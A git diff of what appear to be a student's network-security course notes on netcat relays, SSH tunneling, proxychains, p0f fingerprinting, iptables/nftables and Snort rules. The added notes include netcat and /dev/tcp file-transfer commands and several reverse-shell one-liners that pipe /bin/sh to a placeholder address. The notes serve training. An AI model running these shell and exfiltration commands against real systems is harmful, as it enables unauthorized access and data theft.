@@ -265,52 +265,206 @@ nc -lp 12009
 ### EXAMP
 nc -lp 1234 > piper | nc 10.50.39.61 5432 < piper         
 nc 172.16.82.115 9876 > piper | nc 10.50.39.61 5432 < piper
+>                                                           
+                                                           
+ #### Traffic Redirection
+NetCat / nc
 
-PHRASE 1--I just invent. Then I wait until man comes around to needing what I have invented
-PHRASE 2--Computers have lots of memory but no imagination
-PHRASE 3--Hardware: The parts of a computer system that can be kicked
-PHRASE 4--Technology makes it possible for people to gain control over everything, except over technology          
+Client to Listener File Transfer:
+	Client (sends file): nc 10.2.0.2 9001 < file.txt
+	Listener (receive file): nc -l -p 9001 > newfile.tx
+
+Listener to Client file transfer
+	Listener (sends file): nc -l -p 9001 < file.txt
+	Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+
+netstat -antp to see ports
+
+NetCat Relay:
+		mknod mypipe p									Makes pipe
+		nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe			Redirect standard input into 9002, 
+	On Listener2 (sends info):
+		nc -l -p 9002 < infile.txt
+	On Listener1 (receives info):
+		nc -l -p 9001 > outfile.txt
+
+		Writes the output to listener1 and l
+         listener2 through the named pipe
+		
+File Transfer with /dev/tcp
+	On the receiving box:
+		nc -l -p 1111 > file.txt
+	On the sending box:
+		cat file.txt > /dev/tcp/10.2.0.2/1111
+		This method is useful for host that does not have NETCAT available.		
+		
+
+Reverse shell using NETCAT:
+	When shelled into the remote host using -c :
+		nc -c /bin/sh <your ip> <any unfiltered port>
+	You could even pipe BASH through NETCAT.
+		/bin/sh | nc <your ip> <any unfiltered port>
+	Then listen for the shell:
+		nc -l -p <same unfiltered port> -vvv
+	You can also listen using the -e with NETCAT.
+		nc -l -p <any unfiltered port> -e /bin/bash
+
+
+#### Tunneling
+SSH v1 v2
+sftp - FTP over ssh
+
+SSH Port Forwarding: 
+	Allows for tunneling of other services through SSH
+
+	ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+	or
+	ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
           
-TASK 1
-Task 1 Netcat Relay
+ssh net1_student9@10.50.30.255 -L 10900:10.1.1.11:23 -NT
 
-Objective: You have been provided intel in regards to colecting key intelligence and sensitive data from Donovian Cyberspace, move and redirect all data back to your INTERNET-HOST. A Donovian Insider has stashed important information in the form of JPG images on T2. Each JPG image contains a piece of the message in the form of Steganography. Utilizing Netcat relays, you will use the designated RELAY to transfer the JPG images to your INTERNET-HOST. Once the images are downloaded you will use a command-line tool called steghide to extract the message.
+Dynamic Port Forwarding:
+	ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
+	Proxychains default port is 9050
+Example:
+	ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
+	ssh student@localhost -D 9050 -p 1111 -NT
+	proxychains curl ftp://www.onlineftp.ch
+	proxychains wget -r www.espn.com
+	proxychains ./scan.sh
+	proxychains nmap
 
-Utilize the targets T1, T2, and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+SSH Remote Port Forwarding:
+	ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
+	or
+	ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
 
-    The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
-
-    The Donovian Insider provided a image called 2steg.jpg on T2 and is trying to connect to RELAY on TCP port 4321 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
-
-    The Donovian Insider provided a image called 3steg.jpg on T2 listening for a connection from RELAY on TCP port 6789. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
-
-    The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Use steghide to deode the message. Perform an MD5SUM on this message.
-
-    Use the syntax: steghide extract -sf [image name] to extract the hidden message. Use password when prompted for a passphrase.
+	clarence:	ssh jim@jim-ip -R 1199:localhost:22
+	Me:		ssh -p 1115 jim@localhost -L 1117:localhost:1199
+	Me:		ssh -p 1117 clarence@localhost
           
-
+ssh net1_student9@10.2.2.6 -R 10999:localhost:2222
           
-          
-Task 1
-
-T1
-Hostname: INTERNET_HOST
-External IP: 10.50.XXX.XXX (ALREADY PROVIDED) Internal IP: 10.10.0.40 (ALREADY PROVIDED) (accessed via FLOAT IP)
-creds: (ALREADY PROVIDED)
-Action: Successfully transfer file data between hosts via Netcat
-
-T2
-Hostname: BLUE_HOST-4
-IP: 172.16.82.115
-creds: (NONE)
-Action: Successfully transfer files from this host using Netcat
-
-RELAY
-Hostname: BLUE_INT_DMZ_HOST-1
-IP: 172.16.40.10
-creds: (ALREADY PROVIDED)
-Action: Successfully transfer file data between hosts via Netcat
+Covert Channels:
+	Other protocols can be pulled through these tunnels
+	DNS
+	ICMP
+	HTTP
 
 
+-----------------------------------------------------------------------------------------
+## Network Analysis
+-----------------------------------------------------------------------------------------
+#### Fingerprinting and Host Identification
+Passive:
+	TTL
+	Default IP Header Length
+	Window Size
+	TCP options
+	ICMP data
+
+/etc/p0f/p0f.fp
+	sudo p0f -r wget-pcp -o /var/log/p0f.log
+	sudo cat -n p0f.log | grep "mod=syn" | grep "subj=cli" | grep "srv=10.50.25.35/80"
+read pcaps for os, application version
 
 
+-----------------------------------------------------------------------------------------
+## IP Tables and NAT
+-----------------------------------------------------------------------------------------
+#### 
+Filtering Concepts
+    Whitelist vs Blacklist
+    Default policies and Implicit and Explicit rules
+    Network Device Operation Modes
+        Routed
+        Transparent
+
+Traffic Directions
+    1. Traffic originating from the localhost to the remote-host
+    2. Return traffic from that remote-host back to the localhost.
+    3. Traffic originating from the remote-host to the localhost
+    4. Return traffic from the localhost back to the remote-host.
+
+
+Netfilter paradigm
+    tables - contain chains
+    chains - contain rules
+    rules  - dictate what to match and what actions to perform on packets when packets match a rule
+
+
+
+#### IPTables
+    filter - default table. Provides packet filtering.
+        INPUT, FORWARD, and OUTPUT
+        
+    nat - used to translate private ←→ public address and ports.
+        PREROUTING, POSTROUTING, and OUTPUT
+        
+    mangle - provides special packet alteration. Can modify various fields header fields.
+        All Chains: PREROUTING, POSTROUTING, INPUT, FORWARD and OUTPUT.
+        
+    raw - used to configure exemptions from connection tracking.
+        PREROUTING and OUTPUT
+        
+    security - used for Mandatory Access Control (MAC) networking rules.
+        INPUT, FORWARD, and OUTPUT
+
+
+#### NFTables
+inet - IPv4 and IPv6 packets
+
+There are three chain types:
+    filter - to filter packets - can be used with arp, bridge, ip, ip6, and inet families
+    route  - to reroute packets - can be used with ip and ipv6 families only
+    nat    - used for Network Address Translation - used with ip and ip6 table families only
+
+Hooks:
+PREROUTING
+POSTROUTING
+INPUT
+OUTPUT
+FORWARD not work with nat
+
+
+
+-----------------------------------------------------------------------------------------
+## Signatures and ACL placement
+-----------------------------------------------------------------------------------------
+Snort Rules:
+[action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;)
+    Action - such as alert, log, pass, drop, reject
+    Protocol 			- includes TCP, UDP, ICMP and others
+    Source IP address 		- single address, CIDR notation, range, or any
+    Source Port 		- one, multiple, any, or range of ports
+    Direction		 	- either inbound or in and outbound
+    Destination IP address 	- options mirror Source IP
+    Destination port 		- options mirror Source port
+
+IDS/IPS fails/breaks
+Fail open
+	Defaults to open all traffic
+Fail close
+	Defaults to close all traffic
+                                                          
+                                                           
+                                                           
+                                                           
+                                                          
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
+                                                           
